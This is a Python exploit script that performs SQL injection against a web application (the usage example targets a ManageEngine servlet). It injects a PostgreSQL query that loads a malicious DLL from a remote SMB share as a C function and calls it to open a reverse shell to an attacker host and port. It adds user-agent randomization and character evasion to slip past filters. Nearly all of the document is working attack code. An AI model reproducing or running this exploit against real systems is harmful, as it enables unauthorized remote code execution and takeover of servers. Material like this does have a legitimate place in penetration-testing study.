#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Timeout
timeout = 5

# Default string for empty params
def_str = "1"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection

def sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix):
    print("[*] Using injection string: " + prefix + inj_str + suffix)
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    print("[*] Character evasion string: " + prefix + inj_regex_str + suffix)
    # Injection parameters
    inj_params = dict()
    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = prefix + inj_regex_str + suffix
    # Disable URL encoding characters
    params_str = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    # Do requests
    if get_post.lower() == "get":
        r = requests.get(url,params=params_str,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=params_str,headers=headers,timeout=timeout,verify=False)

# Main
def main(argv):
    if len(sys.argv) == 12:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        share_host = sys.argv[5]
        share_name = sys.argv[6]
        share_file = sys.argv[7]
        dll_function = sys.argv[8]
        revhost = sys.argv[9]
        revport = sys.argv[10]
        url = sys.argv[11]

    else:
        print("[*] Usage: " + sys.argv[0] + " <params> <get_post> <inj_prefix> <inj_suffix> <share_host> <share_name> <share_file> <dll_function> <revshell_host> <revshell_port> <url>")
        print("[*] Example: " + sys.argv[0] + " ForMasRange,userId post \";\" \";-- \" 192.168.252.4 someshare revshell.dll maliciousfunc 192.168.252.4 6969 https://manageengine:8443/servlet/AMUserResourcesSyncServlet\n")
        exit(0)
    
    # User Agent
    headers = random_agent()

    # Host and share to host file on
    share_unc = share_host + "\\" + share_name + "\\" + share_file

    # SQL Query
    query = "create or replace function " + dll_function + "(text,integer) returns void as $$\\\\" + share_unc + "$$, $$connect_back$$ language c strict;"
    query += "select " + dll_function + "('" + revhost + "', " + revport +")"

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Perform the request
        sqli(url,headers,get_post,inj_param,params,prefix,query,suffix)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
